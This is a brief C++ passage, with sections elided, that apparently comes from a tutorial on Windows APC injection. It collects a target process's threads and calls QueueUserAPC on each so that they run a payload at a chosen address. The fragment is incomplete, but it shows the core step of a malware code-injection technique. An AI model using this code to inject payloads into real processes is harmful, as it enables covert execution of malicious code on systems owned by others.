...
int main(int argc, char** argv) {
	...
	// Make a list to store the threads of our process using a bit of C++
	std::vector<DWORD> threadIds;

	// Iterate through all threads until the threads of our target process are found
	...
	// For every thread in our process, open a handle and queue our payload as an APC
	for (DWORD threadId : threadIds) {
		HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
		QueueUserAPC((PAPCFUNC)lpTargetAddress, hThread, NULL);
	}
